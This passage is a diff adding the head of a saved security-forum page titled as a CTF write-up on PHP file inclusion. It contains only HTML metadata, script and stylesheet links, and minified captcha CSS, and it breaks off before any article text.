@@ -1,0 +1,866 @@
+<!DOCTYPE html>
+<!-- saved from url=(0055)https://xianzhi.aliyun.com/forum/topic/1576/#reply-7330 -->
+<html lang="en" class=""><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    
+
+    <title>先知安全技术社区</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0, user-scalable=no">
+    <meta name="description" content="">
+    <meta name="author" content="">
+    <link rel="icon" href="https://xianzhi.aliyun.com/forum/static/icon/favicon.ico" type="image/x-icon">
+    <!-- Le styles -->
+    <link href="./一道CTF题：PHP文件包含_files/bootstrap.min.css" rel="stylesheet">
+    <link rel="stylesheet" href="./一道CTF题：PHP文件包含_files/editormd.min.css">
+    <link rel="stylesheet" type="text/css" href="./一道CTF题：PHP文件包含_files/topic.css">
+    <link rel="stylesheet" href="./一道CTF题：PHP文件包含_files/tango.css">
+    <link rel="stylesheet" href="./一道CTF题：PHP文件包含_files/OverlayStyle.css">
+    <link rel="stylesheet" href="./一道CTF题：PHP文件包含_files/beautify.css">
+
+
+    <style>
+        body {
+            background-color: rgb(249, 249, 249);
+        }
+
+        form {
+            margin: 0 !important;
+        }
+
+        .box {
+            background-color: rgb(255, 255, 255);
+            -moz-border-radius: 3px;
+            border-radius: 3px;
+            -moz-box-shadow: 0 2px 5px rgba(0, 0, 0, 0.15);
+            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.15);
+            border-bottom: 2px solid #e2e2e9;
+            margin-top: 20px;
+        }
+
+        .box-container {
+            padding: 8px 8px 20px 8px;
+        }
+
+        .box ul, ol {
+            margin-bottom: 0 !important;
+        }
+
+        .footer {
+            min-height: 80px;
+            height: 50px;
+            padding-top: 88px;
+            text-align: left;
+            color: #999;
+            bottom: 50px;
+        }
+
+        .markdown-body ul {
+            list-style-type: disc;
+        }
+
+        .box a:hover {
+            text-decoration: none;
+        }
+
+        .container {
+            width: 68% !important;
+        }
+
+        .box-container > ul > li, .noti-list > ul > li {
+            list-style-type: none;
+        }
+
+        .brand-title {
+            color: #777;
+            display: inline-block;
+            vertical-align: middle;
+            position: relative;
+        }
+
+        .live-entry span:hover {
+            background-color: rgb(249, 249, 249);
+            color: #FA5555 !important;
+        }
+
+
+    </style>
+    <link href="./一道CTF题：PHP文件包含_files/bootstrap-responsive.min.css" rel="stylesheet">
+
+
+    
+    <link rel="stylesheet" href="./一道CTF题：PHP文件包含_files/editormd.css">
+    <link rel="stylesheet" href="./一道CTF题：PHP文件包含_files/tango.css">
+    <link rel="stylesheet" href="./一道CTF题：PHP文件包含_files/OverlayStyle.css">
+
+    <!--[if lte IE 8]>
+        <script src="http://code.jquery.com/jquery-1.11.3.min.js"></script>
+    <![endif]-->
+    <!--[if !IE]> -->
+    <script async="" src="./一道CTF题：PHP文件包含_files/105.js" id="sd-collina-acjs"></script><script type="text/javascript" class="nc-required-js-1 nc-umid-script" src="./一道CTF题：PHP文件包含_files/um.js"></script><script type="text/javascript" class="nc-required-js-1 nc-uab-script" src="./一道CTF题：PHP文件包含_files/uac.js"></script><script type="text/javascript" src="./一道CTF题：PHP文件包含_files/jquery-2.1.3.min.js"></script>
+    <!-- <![endif]-->
+    <script src="./一道CTF题：PHP文件包含_files/utils.js"></script>
+    <script src="./一道CTF题：PHP文件包含_files/getCookie.js"></script>
+    <script src="./一道CTF题：PHP文件包含_files/bootstrap.min.js"></script>
+    
+    <script type="text/javascript" charset="utf-8" src="./一道CTF题：PHP文件包含_files/nc.js"></script><style>@charset "utf-8";
+@font-face{font-family:'nc_iconfont';src:url("//at.alicdn.com/t/font_1465353706_4784257.eot");src:url("//at.alicdn.com/t/font_1465353706_4784257.eot?#iefix") format('embedded-opentype'),url("//at.alicdn.com/t/font_1465353706_4784257.woff") format('woff'),url("//at.alicdn.com/t/font_1465353706_4784257.ttf") format('truetype'),url("//at.alicdn.com/t/font_1465353706_4784257.svg#iconfont") format('svg')}@font-face{font-family:'ncpc_iconfont';src:url("//at.alicdn.com/t/font_384029_rhzpmteb25oecdi.eot");src:url("//at.alicdn.com/t/font_384029_rhzpmteb25oecdi.eot?#iefix") format('embedded-opentype'),url("//at.alicdn.com/t/font_384029_rhzpmteb25oecdi.woff") format('woff'),url("//at.alicdn.com/t/font_384029_rhzpmteb25oecdi.ttf") format('truetype'),url("//at.alicdn.com/t/font_384029_rhzpmteb25oecdi.svg#ncpc_iconfont") format('svg')}.nc-container div#nc-loading-circle{background:transparent;width:20px;height:20px;display:inline-block;position:relative;vertical-align:middle}.nc-container div#nc-loading-circle .sk-circle{background:transparent;width:100%;height:100%;position:absolute;left:0;top:0}.nc-container #nc-loading-circle .sk-circle:before{content:'';display:block;margin:0 auto;width:15%;height:15%;background-color:#818181;border-radius:100%;-webkit-animation:sk-circleFadeDelay 1.2s infinite ease-in-out both;animation:sk-circleFadeDelay 1.2s infinite ease-in-out both}.nc-container #nc-loading-circle .sk-circle2{-webkit-transform:rotate(30deg);-ms-transform:rotate(30deg);transform:rotate(30deg)}.nc-container #nc-loading-circle .sk-circle3{-webkit-transform:rotate(60deg);-ms-transform:rotate(60deg);transform:rotate(60deg)}.nc-container #nc-loading-circle .sk-circle4{-webkit-transform:rotate(90deg);-ms-transform:rotate(90deg);transform:rotate(90deg)}.nc-container #nc-loading-circle .sk-circle5{-webkit-transform:rotate(120deg);-ms-transform:rotate(120deg);transform:rotate(120deg)}.nc-container #nc-loading-circle .sk-circle6{-webkit-transform:rotate(150deg);-ms-transform:rotate(150deg);transform:rotate(150deg)}.nc-container #nc-loading-circle .sk-circle7{-webkit-transform:rotate(180deg);-ms-transform:rotate(180deg);transform:rotate(180deg)}.nc-container #nc-loading-circle .sk-circle8{-webkit-transform:rotate(210deg);-ms-transform:rotate(210deg);transform:rotate(210deg)}.nc-container #nc-loading-circle .sk-circle9{-webkit-transform:rotate(240deg);-ms-transform:rotate(240deg);transform:rotate(240deg)}.nc-container #nc-loading-circle .sk-circle10{-webkit-transform:rotate(270deg);-ms-transform:rotate(270deg);transform:rotate(270deg)}.nc-container #nc-loading-circle .sk-circle11{-webkit-transform:rotate(300deg);-ms-transform:rotate(300deg);transform:rotate(300deg)}.nc-container #nc-loading-circle .sk-circle12{-webkit-transform:rotate(330deg);-ms-transform:rotate(330deg);transform:rotate(330deg)}.nc-container #nc-loading-circle .sk-circle2:before{-webkit-animation-delay:-1.1s;animation-delay:-1.1s}.nc-container #nc-loading-circle .sk-circle3:before{-webkit-animation-delay:-1s;animation-delay:-1s}.nc-container #nc-loading-circle .sk-circle4:before{-webkit-animation-delay:-.9s;animation-delay:-.9s}.nc-container #nc-loading-circle .sk-circle5:before{-webkit-animation-delay:-.8s;animation-delay:-.8s}.nc-container #nc-loading-circle .sk-circle6:before{-webkit-animation-delay:-.7s;animation-delay:-.7s}.nc-container #nc-loading-circle .sk-circle7:before{-webkit-animation-delay:-.6s;animation-delay:-.6s}.nc-container #nc-loading-circle .sk-circle8:before{-webkit-animation-delay:-.5s;animation-delay:-.5s}.nc-container #nc-loading-circle .sk-circle9:before{-webkit-animation-delay:-.4s;animation-delay:-.4s}.nc-container #nc-loading-circle .sk-circle10:before{-webkit-animation-delay:-.3s;animation-delay:-.3s}.nc-container #nc-loading-circle .sk-circle11:before{-webkit-animation-delay:-.2s;animation-delay:-.2s}.nc-container #nc-loading-circle .sk-circle12:before{-webkit-animation-delay:-.1s;animation-delay:-.1s}@-webkit-keyframes sk-circleFadeDelay{0%,39%,100%{opacity:0}40%{opacity:1}}@-webkit-keyframes sk-circleFadeDelay{0%,39%,100%{opacity:0}40%{opacity:1}}@keyframes sk-circleFadeDelay{0%,39%,100%{opacity:0}40%{opacity:1}}.nc-container .scale_text2 #nc-loading-circle .sk-circle:before{background-color:#fff}.nc_iconfont{font-family:"nc_iconfont";color:#ff3f08;font-size:16px;font-style:normal}.ncpc_iconfont{font-family:"ncpc_iconfont";color:#ff3f08;font-size:16px;font-style:normal}.captcha-error .icon_ban{float:left;font-size:16px;padding-right:5px;line-height:14px}.clickCaptcha_text .btn_refresh{font-style:normal;cursor:pointer;background:#fff;color:#737383}.imgCaptcha .btn_refresh{font-size:20px;cursor:pointer;background:#fff;color:#737383}.nc_voice{display:none;position:relative;margin-top:-34px;z-index:99;width:auto;height:34px;background:#fff}.omeo-code-img,.omeo-code-audio{font-size:0;text-align:left}.omeo-code-audiobox,.omeo-code-img a,.omeo-code-audio a,.omeo-code-state{display:inline-block;*display:inline;zoom:1;height:32px;vertical-align:top;font-size:12px}.omeo-code .omeo-code-refresh{background:transparent;width:32px;height:32px;font-size:20px;color:#888;text-align:center;text-decoration:none;padding-left:4px;line-height:32px}.omeo-code .omeo-switch{display:none;width:32px;height:32px;border-left:1px solid #e1e1e1;background-image:url("//g.alicdn.com/sd/ncpc/images/checkcode.png");background-repeat:no-repeat}.omeo-img-active .omeo-code-img{display:block}.omeo-img-active .omeo-code-audio{display:none}.omeo-code-img img{border:1px solid #cdcdcd;cursor:pointer}.omeo-code-img .omeo-switch{background-position:9px -41px}.omeo-audio-active .omeo-code-audio{display:block}.omeo-audio-active .omeo-code-img{display:none}.omeo-code-refresh{position:relative;left:95px}.omeo-code-audiobox{position:relative;height:30px;line-height:32px;border:1px solid #e1e1e1;text-align:center;overflow:hidden;left:100px;top:1px;width:45%;min-width:80px;background-color:#eee}.omeo-code-audiobox a{display:block;text-decoration:none;color:#06c}.omeo-code-audiobox-playing a{visibility:hidden}.omeo-code-audiobox span,.omeo-code-audiobox b{visibility:hidden;position:absolute;top:0;left:0;height:30px;font-weight:100;overflow:hidden}.omeo-code-audiobox-playing span,.omeo-code-audiobox-playing b{visibility:visible}.omeo-code-audiobox span{z-index:0;width:0;background:#186bca}.omeo-code-audiobox b{width:100%;z-index:1;text-align:left;text-indent:30px;color:#999;background:url("//g.alicdn.com/sd/ncpc/images/checkcode.png") no-repeat 14px -89px}.omeo-code-audio .omeo-switch{background-position:5px 10px}input[type=text]::-ms-clear{display:none}.omeo-box{position:relative;background-color:#fff}.omeo-code-echo{position:absolute;top:2px;left:2px}.omeo-code-echo input{padding:5px;height:18px;line-height:18px;border:1px solid #ddd;width:80px;outline:0}.omeo-code-state{height:30px;line-height:30px;text-indent:25px;white-space:nowrap;background-image:url("//g.alicdn.com/sd/ncpc/images/checkcode.png");background-repeat:no-repeat;background-position:100px 100px}.omeo-code-echo .omeo-code-state-error{width:auto;background-position:7px -193px}.omeo-code-echo .omeo-code-state-success{position:absolute;width:30px;background-position:7px -243px}.omeo-code-state{position:absolute;left:0;top:28px}.nc_voice_close{display:inline-block;position:relative;cursor:pointer;left:95px;top:0;border-left:#ddd 2px solid;padding:0 0 0 7px;background-color:#fff;font-size:20px;color:#888;line-height:32px}.nc_help{position:absolute;width:100%;height:100%;left:0;top:0;z-index:99999}.nc_help .mask{background-color:#000;opacity:.5;filter:alpha(opacity=50);width:100%;height:100%;top:0;left:0}.nc_btn_close{position:absolute;height:20px;left:500px;border-radius:20px;padding:10px 30px;background-color:#aaa;color:#fff;cursor:pointer;z-index:10}.nc_btn_close:hover{background-color:#afafaf}.nc_hand{position:absolute;width:68px;height:53px;background-image:url("//g.alicdn.com/sd/ncpc/images/hand.png");z-index:3}.nc_slide_bg{z-index:3;font-size:12px;text-align:center;color:#fff;line-height:34px}.nc_voicebtn{position:absolute;padding:0;right:-25px;font-size:23px;color:#888;cursor:pointer;line-height:34px}.nc_helpbtn{position:absolute;cursor:pointer;right:-95px;top:4px;font-size:12px;background-color:#ffb668;color:#fff;padding:4px;border-radius:2px;line-height:18px;display:none}.nc_helpbtn:before{width:0;height:0;content:"";position:absolute;left:-2px;top:6px;border-top:4px solid transparent;border-bottom:4px solid transparent;border-right:4px solid #ffb668}.nc-container .errloading{border:#faf1d5 1px solid;text-indent:3px;background-image:none;font-size:12px;width:290px;line-height:20px;padding:7px 5px 8px 5px;color:#ef9f06;}.nc-container .errloading a{color:#30a7fc}.nc_captcha_text .nc_err{float:left;text-indent:0}.button_move{transition:left .5s;-moz-transition:left .5s;-webkit-transition:left .5s;-o-transition:left .5s}.bg_move{transition:width .5s;-moz-transition:width .5s;-webkit-transition:width .5s;-o-transition:width .5s}.nc_slide_box{position:absolute}.nc_captcha_text{height:auto;line-height:20px;visibility:hidden;font-size:12px;color:#999;font-weight:normal}.nc-container .nc_captcha_img_text{width:auto;height:auto;line-height:20px;visibility:hidden;font-size:12px;color:#999;font-weight:normal;display:none;padding:0 0 10px 0;background-position:0 0;}.nc-container .nc_captcha_img_text span.nc-lang-cnt{line-height:inherit}.nc-container .imgCaptcha .nc_captcha_img_text{width:auto}.nc_captcha_img_text{height:auto;line-height:20px;visibility:hidden;font-size:12px;color:#999;font-weight:normal;display:none;padding:0 0 10px 3px;background-position:0 0}.nc-container .nc_wrapper{width:auto}.nc_scale{width:auto;height:34px;background:#e8e8e8;position:relative;margin:0;padding:0}.nc_scale.is_audio{margin-right:25px}.nc-container .nc_scale div{height:auto}.nc-container .nc_scale ul{list-style:none}.nc-container .nc_scale .btn_slide{color:#737383;background-image:none;-webkit-font-smoothing:antialiased;-moz-osx-font-smoothing:grayscale}.nc-container .nc_scale span{text-align:center;width:40px;height:32px;line-height:32px;border:1px solid #ccc;position:absolute;left:0;cursor:move;background:#fff;z-index:2}.nc-container .nc_scale span.nc-lang-cnt{*line-height:34px;float:none;width:auto;height:auto;*height:34px;border:none;position:static;cursor:inherit;background:none;z-index:0;display:inline}.nc_slide_button{width:40px;height:32px;border:1px solid #ccc;position:absolute;left:0;cursor:move;background:#fff url("//g.alicdn.com/sd/ncpc/images/rt.png") no-repeat center;z-index:2}@media screen and (-ms-high-contrast:active),(-ms-high-contrast:none){.nc_scale span{height:32px}}.nc-container .nc_scale .btnok{cursor:default;background:#fff url("//g.alicdn.com/sd/ncpc/images/yes.png") no-repeat center;z-index:3}.nc-container .nc_scale .btnok2{cursor:default;font-size:20px;background:#fff url("//g.alicdn.com/sd/ncpc/images/no.png") no-repeat center;z-index:3}.nc-container .nc_scale .btn_warn{cursor:default;color:#ff3f08;line-height:34px;text-align:center;font-size:20px;background:#fff;z-index:3}.nc-container .clickCaptcha_text .btn_refresh{font-size:20px}.nc-container .clickCaptcha_text .icon_close{line-height:30px;margin-left:8px;cursor:default;color:#ff3f08;font-size:16px;float:left;margin-right:2px;background:transparent;z-index:3}.nc-container .nc_captcha_img_text .icon_close{cursor:default;color:#ff3f08;font-size:16px;float:left;margin-right:4px;background:transparent;z-index:3;line-height:18px}.nc-container .errloading .icon_warn{cursor:default;color:#ff3f08;font-size:18px;float:left;background:transparent;z-index:3}.nc-container .nc_scale .btn_ok{cursor:default;line-height:34px;text-align:center;font-size:20px;background:#fff;z-index:3;color:#76c61d}.nc-container .nc_scale .nc_ok,.nc-container .nc_scale .nc_bg{background:#7ac23c}.nc-container .nc_scale .nc_bg{position:absolute;height:100%;_height:34px;left:0;width:10px}.nc-container .nc_scale div.redbar{background:#fc461e;opacity:.5;filter:alpha(opacity=50)}.nc-container .nc_scale div.orange{background:#f00}.nc-container .nc_scale .scale_text{width:100%;height:100%;text-align:center;position:absolute;z-index:1;background:transparent;color:#9c9c9c;line-height:34px;font-size:12px;cursor:pointer}.nc-container .nc_scale .scale_text2{text-align:left;color:#fff;font-size:12px;text-indent:10px}.nc-container .nc_scale .scale_text2 b{padding-left:0;font-weight:normal}.nc-container .nc_scale .scale_text.scale_loading_text{text-align:center}.nc-container .nc_scale .imgCaptcha,.nc-container .nc_scale .clickCaptcha{display:none;overflow:hidden;border:1px solid #ccc;background:#fff;z-index:20000;}.nc-container .nc_scale .imgCaptcha p.error span,.nc-container .nc_scale .clickCaptcha p.error span{line-height:normal}.nc-container .nc_scale .imgCaptcha{height:auto}.nc-container .nc_scale .clickCaptcha{position:absolute;left:0;top:35px;height:270px;background:#fff;display:none;}.nc-container .nc_scale .clickCaptcha p.error i{color:#ff3f08;font-style:normal}.nc-container .nc_scale .clickCaptcha div{position:static;clear:both;width:100%;background:#fff;height:auto}.nc-container .nc_scale .clickCaptcha .clickCaptcha_text{height:30px;line-height:30px;font-size:12px;color:#999;}.nc-container .nc_scale .clickCaptcha .clickCaptcha_text b{font-weight:normal}.nc_btn_2{position:absolute;right:0;top:0;cursor:pointer;margin:2px 9px 0 0}.nc_iconfont.nc_btn_2{position:absolute;right:0;top:0;cursor:pointer}.nc_iconfont.nc_btn_1{position:absolute;top:10px;right:5px}.nc_btn_1{top:10px;right:10px}.scale_text i{font-style:normal;border:none;position:static;cursor:default;color:#fffc00;background:none;display:inline;width:100%}.nc-container .clickCaptcha .clickCaptcha_img{margin:0 auto;clear:both;position:relative;}.nc-container .clickCaptcha .clickCaptcha_img img{width:230px;height:230px;margin-left:10px;margin-top:5px}.nc-container .clickCaptcha .clickCaptcha_btn{margin:10px 0 0 15px;position:relative;text-align:left;}.nc-container .clickCaptcha .clickCaptcha_btn img{cursor:pointer}.nc-container .imgCaptcha{position:absolute;left:0;top:35px;height:auto;padding-bottom:15px;border:1px solid #ccc;background:#fff;}.nc-container .imgCaptcha div{position:static;width:90%;background-color:#fff}.nc-container .imgCaptcha,.nc-container .clickCaptcha{text-align:left;}.nc-container .imgCaptcha a,.nc-container .clickCaptcha a{color:#ff3f08}.nc-container .imgCaptcha .imgCaptcha_text{height:42px;line-height:42px;width:120px;background:#fff;font-size:14px;text-align:left;color:#747474;float:left;margin-left:10px;}.nc-container .imgCaptcha .imgCaptcha_text input{margin-top:5px;height:30px;line-height:30px;font-size:14px;width:90px;background:#fff}.nc-container .imgCaptcha .imgCaptcha_text input:focus{outline:none;color:#bbb}.nc-container .imgCaptcha .imgCaptcha_btn{margin:0 0 0 12px;*margin-left:0;clear:both;padding-top:5px;width:90%;}.nc-container .imgCaptcha .imgCaptcha_btn img{cursor:pointer}.nc-container .imgCaptcha .nc_scale_submit{margin:0 auto;cursor:pointer;background-color:#fc461e;width:120px;height:32px;line-height:32px;color:#fff;text-align:center}.nc-container .imgCaptcha .imgCaptcha_img{margin:4px 0 0 100px;height:40px;width:130px;overflow:hidden;cursor:pointer;}.nc-container .imgCaptcha .imgCaptcha_img img{width:130px}.nc-container .imgCaptcha .imgCaptcha_img input{border:solid 1px #ccc}.nc-lang-ar_MA,.nc-lang-ar_SA,.nc-lang-iw_HE,.nc-lang-iw_IL{text-align:right;*text-align:left;}.nc-lang-ar_MA .nc_scale .scale_text2,.nc-lang-ar_SA .nc_scale .scale_text2,.nc-lang-iw_HE .nc_scale .scale_text2,.nc-lang-iw_IL .nc_scale .scale_text2{text-align:right;}.nc-lang-ar_MA .nc_scale .scale_text2 span,.nc-lang-ar_SA .nc_scale .scale_text2 span,.nc-lang-iw_HE .nc_scale .scale_text2 span,.nc-lang-iw_IL .nc_scale .scale_text2 span{*display:inline-block;padding:0 56px 0 0}.nc-lang-ar_MA .nc_captcha_img_text,.nc-lang-ar_SA .nc_captcha_img_text,.nc-lang-iw_HE .nc_captcha_img_text,.nc-lang-iw_IL .nc_captcha_img_text{*text-align:right}.nc-lang-ar_MA span.nc-lang-cnt,.nc-lang-ar_SA span.nc-lang-cnt,.nc-lang-iw_HE span.nc-lang-cnt,.nc-lang-iw_IL span.nc-lang-cnt{text-align:right;direction:rtl}.nocaptcha span.nc-lang-cnt{float:none;height:auto;line-height:30px}.nc-container{font-size:12px;-ms-touch-action:none;touch-action:none;}.nc-container p{margin:0;padding:0;display:inline}.nc-container .scale_text.scale_text span[data-nc-lang="_startTEXT"]{display:inline-block;width:100%}.nc-container .scale_text.scale_text.slidetounlock span[data-nc-lang="_startTEXT"]{background:-webkit-gradient(linear,left top,right top,color-stop(0,#4d4d4d),color-stop(.4,#4d4d4d),color-stop(.5,#fff),color-stop(.6,#4d4d4d),color-stop(1,#4d4d4d));-webkit-background-clip:text;-webkit-text-fill-color:transparent;-webkit-animation:slidetounlock 3s infinite;-webkit-text-size-adjust:none}.nc-container .nc_scale .nc-align-center.scale_text2{text-align:center;text-indent:-42px}@-webkit-keyframes slidetounlock{0%{background-position:-200px 0}100%{background-position:200px 0}}.nc-container.tb-login .clickCaptcha_text .icon_close{line-height:30px;margin-left:0;cursor:default;color:#ff3f08;font-size:16px;float:left;margin-right:0;background:transparent;z-index:3}.nc-container.tb-login{position:relative;margin-top:20px;display:none;}.nc-container.tb-login .nc_scale{width:auto;}.nc-container.tb-login .nc_scale .scale_text2{text-indent:-42px;text-align:center;}.nc-container.tb-login .nc_scale .scale_text2 b{padding:0}.nc-container.tb-login .nc_scale.nc_err div.scale_text{background:#f79977}.nc-container.tb-login .errloading{width:auto}.nc-container.tb-login .imgCaptcha,.nc-container.tb-login .clickCaptcha{width:252px;*width:256px;border:0;*height:300px;min-height:300px;max-height:inherit !important;}.nc-container.tb-login .imgCaptcha div.login-msg.error,.nc-container.tb-login .clickCaptcha div.login-msg.error{background:#fff2f2}.nc-container.tb-login .imgCaptcha .captcha-error,.nc-container.tb-login .clickCaptcha .captcha-error{position:absolute;top:0;width:244px;height:auto;margin-bottom:15px;padding:3px;border:solid 1px #ff8e8e;line-height:18px}.nc-container.tb-login .imgCaptcha .captcha-inform,.nc-container.tb-login .clickCaptcha .captcha-inform{font-size:110%;margin-left:20px}.nc-container.tb-login .imgCaptcha{padding-top:66px;}.nc-container.tb-login .imgCaptcha .imgCaptcha_text{width:100px;margin-left:0;}.nc-container.tb-login .imgCaptcha .imgCaptcha_text input:focus{color:#000}.nc-container.tb-login .imgCaptcha .imgCaptcha_img{width:120px;_width:100px}.nc-container.tb-login .imgCaptcha .imgCaptcha_btn{width:100%;margin-left:0}.nc-container.tb-login .imgCaptcha .nc_scale_submit{width:100%;height:36px;line-height:36px;margin-top:20px;margin-left:0;border-radius:3px;font-size:16px;font-family:Tahoma,Helvetica,Arial,sans-serif;background:#ff3f08}.nc-container.tb-login .clickCaptcha{padding-top:40px;}.nc-container.tb-login .clickCaptcha .clickCaptcha_text{text-indent:4px}.nc-container.tb-login .clickCaptcha .clickCaptcha_img img{margin-left:10px}.nc-container.tb-login .nc_btn_1{top:77px;_top:57px}.nc-container.tb-login .nc_btn_2{top:36px}.login .nc-container.tb-login .login-msg p,.login-box .nc-container.tb-login .login-msg p{width:auto;float:left}.nc-container.tb-login.nc-old-login{margin:20px 0 10px 0;width:250px;}.nc-container.tb-login.nc-old-login .nc_wrapper{width:250px}.nc-container.tb-login.nc-old-login .imgCaptcha,.nc-container.tb-login.nc-old-login .clickCaptcha{width:250px;min-height:auto;}.nc-container.tb-login.nc-old-login .imgCaptcha .captcha-error,.nc-container.tb-login.nc-old-login .clickCaptcha .captcha-error{line-height:16px}.nc-container.tb-login.nc-old-login .clickCaptcha{padding-top:28px;}.nc-container.tb-login.nc-old-login .clickCaptcha .clickCaptcha_img img{width:200px;height:200px}.nc-container.nc-old-login.show-click-captcha{padding-bottom:60px}.nc-container.nc-old-login.show-click-captcha.nc-tm-min-fix{padding-bottom:40px}.nc-container.tb-login.nc-tm-min-fix .clickCaptcha{max-height:340px !important}#content .login-box .bd .nc-container.tb-login .login-msg{margin:10px auto 15px auto}#content .login-box .bd .nc-container.tb-login.nc-old-login.show-click-captcha .login-msg{margin:2px 0 0 0}.nc-container .nc_scale .nc-cc{display:none;position:absolute;left:0;top:35px;z-index:20000;width:360px;height:570px;border:1px solid #5eaef1;border-radius:4px;background:#fff;font-size:14px;line-height:18px;color:#333;}.nc-container .nc_scale .nc-cc.nc-cc-status-loading .nc-cc-btn,.nc-container .nc_scale .nc-cc.nc-cc-status-verifing .nc-cc-btn{background-color:#90c1eb}.nc-container .nc_scale .nc-cc.nc-cc-status-loading .nc-cc-btn,.nc-container .nc_scale .nc-cc.nc-cc-status-verifing .nc-cc-btn,.nc-container .nc_scale .nc-cc.nc-cc-status-loading .nc-cc-refresh,.nc-container .nc_scale .nc-cc.nc-cc-status-verifing .nc-cc-refresh{cursor:default}.nc-container .nc_scale .nc-cc.nc-cc-status-loading .nc-cc-refresh,.nc-container .nc_scale .nc-cc.nc-cc-status-verifing .nc-cc-refresh{color:#999}.nc-container .nc_scale .nc-cc a{color:#3199f4;text-decoration:none}.nc-container .nc_scale .nc-cc .nc_iconfont{vertical-align:top;margin-right:8px}.nc-container .nc_scale .nc-cc-btn{display:inline-block;*display:inline;*zoom:1;vertical-align:top;letter-spacing:normal;word-spacing:normal;width:100px;line-height:30px;text-align:center;background-color:#3199f4;color:#fff;border-radius:4px;cursor:pointer;}.nc-container .nc_scale .nc-cc-btn.nc-cc-disabled{background-color:#90c1eb;cursor:default}.nc-container .nc_scale .nc-cc-btn .nc-lang-cnt{line-height:18px}.nc-container .nc_scale .nc-cc-header{padding:20px 20px 19px 20px;height:100px;background:#f4f8fa;border-bottom:1px solid #ccc}.nc-container .nc_scale .nc-cc-img1-box{float:left;width:100px;height:100px;margin-right:16px}.nc-container .nc_scale .nc-cc-txt{overflow:hidden;*zoom:1;line-height:30px;padding-top:11px}.nc-container .nc_scale .nc-cc-img2-box{position:relative;padding:0 20px;margin-top:20px}.nc-container .nc_scale .nc-cc-items{position:absolute;left:20px;_left:0;top:0;width:320px;overflow:hidden}.nc-container .nc_scale .nc-cc-items-inner{margin-right:-20px}.nc-container .nc_scale .nc-cc-item{position:relative;display:inline-block;*display:inline;*zoom:1;vertical-align:top;letter-spacing:normal;word-spacing:normal;margin-right:10px;margin-bottom:10px;border:1px solid #ccc;width:98px;height:98px;background:url("//gtms02.alicdn.com/tps/i2/T1ty2QFNNXXXc6Yc2r-1-1.gif");}.nc-container .nc_scale .nc-cc-item:hover{border-color:#3199f4}.nc-container .nc_scale .nc-cc-item .nc_iconfont{display:none;position:absolute;right:0;bottom:0;color:#3199f4;font-size:22px;margin-right:0}.nc-container .nc_scale .nc-cc-item.nc-cc-selected .nc_iconfont{display:block}.nc-container .nc_scale .nc-cc-tip{display:none;position:absolute;left:0;bottom:60px;width:360px;line-height:18px;text-align:center;color:#eb4f38;}.nc-container .nc_scale .nc-cc-tip span{line-height:normal}.nc-container .nc_scale .nc-cc-footer{position:absolute;left:0;bottom:20px;width:360px;height:30px;line-height:30px;text-align:center;}.nc-container .nc_scale .nc-cc-footer .nc_iconfont{color:#c4cbd0}.nc-container .nc_scale .nc-cc-refresh,.nc-container .nc_scale .nc-cc-wait{position:absolute;left:20px;top:0;color:#3199f4;cursor:pointer}.nc-container .nc_scale .nc-cc-wait{display:none}.nc-container .nc_scale .nc-cc-cancel{position:absolute;right:20px;top:0;color:#3199f4;cursor:pointer;}.nc-container .nc_scale .nc-cc-cancel .nc_iconfont{position:relative;top:-1px}.nc-container .nc_scale .nc-cc-loading{margin-top:247px;text-align:center;line-height:14px}.nc-container .nc_scale .nc-cc-loading-img{display:inline-block;*display:inline;*zoom:1;vertical-align:top;letter-spacing:normal;word-spacing:normal;vertical-align:middle;background:url("//img.alicdn.com/tps/TB1OdxsKpXXXXcgXFXXXXXXXXXX-14-14.gif") no-repeat;width:14px;height:14px;position:relative;top:-1px;margin-right:9px}.nc-container .nc_scale .nc-cc-fail{position:absolute;left:50%;top:50%;width:320px;height:180px;margin-left:-160px;margin-top:-90px;background:#fff;border-radius:4px}.nc-container .nc_scale .nc-cc-fail-inner{text-align:center;padding:55px 10px 10px}.nc-container .nc_scale .nc-cc-fail-action{margin:28px 0 18px;}.nc-container .nc_scale .nc-cc-fail-action a{display:inline-block;*display:inline;*zoom:1;vertical-align:top;letter-spacing:normal;word-spacing:normal;line-height:30px;margin-left:16px}.nc-container .nc_scale .nc-cc-contact{text-align:right;color:#666;padding-right:9px}.nc-container .nc_scale .nc-cc-mask{display:none;position:absolute;left:0;top:0;width:360px;height:570px;background:rgba(0,0,0,0.3);filter:progid:DXImageTransform.Microsoft.gradient(enabled='true',startColorstr='#4C000000', endColorstr='#4C000000');}:root .nc-container .nc_scale .nc-cc-mask{-webkit-filter:none;filter:none}.nc-container .nc_scale .nc-cc-arrow-1,.nc-container .nc_scale .nc-cc-arrow-2{display:none;position:absolute;top:340px;border:solid transparent;height:0;width:0}.nc-container .nc_scale .nc-cc-arrow-1{border-width:16px;margin-top:-1px}.nc-container .nc_scale .nc-cc-arrow-2{border-width:15px}.nc-container .nc_scale .nc-cc-right .nc-cc-arrow-1,.nc-container .nc_scale .nc-cc-left .nc-cc-arrow-1,.nc-container .nc_scale .nc-cc-right .nc-cc-arrow-2,.nc-container .nc_scale .nc-cc-left .nc-cc-arrow-2{display:block;_display:none}.nc-container .nc_scale .nc-cc-right{left:180px;top:-339px;}.nc-container .nc_scale .nc-cc-right .nc-cc-arrow-1{border-right-color:#5eaef1;left:-32px}.nc-container .nc_scale .nc-cc-right .nc-cc-arrow-2{border-right-color:#fff;left:-30px}.nc-container .nc_scale .nc-cc-left{left:-335px;top:-339px;}.nc-container .nc_scale .nc-cc-left .nc-cc-arrow-1{border-left-color:#5eaef1;right:-32px}.nc-container .nc_scale .nc-cc-left .nc-cc-arrow-2{border-left-color:#fff;right:-30px}</style>
+    <script src="./一道CTF题：PHP文件包含_files/editormd.min.js"></script>
+
+<link type="text/css" rel="stylesheet" href="./一道CTF题：PHP文件包含_files/codemirror.min.css"><link type="text/css" rel="stylesheet" href="./一道CTF题：PHP文件包含_files/dialog.css"><link type="text/css" rel="stylesheet" href="./一道CTF题：PHP文件包含_files/matchesonscrollbar.css"><script id="-forum-static-editor-md-lib-codemirror-codemirror-min" type="text/javascript" src="./一道CTF题：PHP文件包含_files/codemirror.min.js"></script><style id="style-1-cropbar-clipper">/* Copyright 2014 Evernote Corporation. All rights reserved. */
+.en-markup-crop-options {
+    top: 18px !important;
+    left: 50% !important;
+    margin-left: -100px !important;
+    width: 200px !important;
+    border: 2px rgba(255,255,255,.38) solid !important;
+    border-radius: 4px !important;
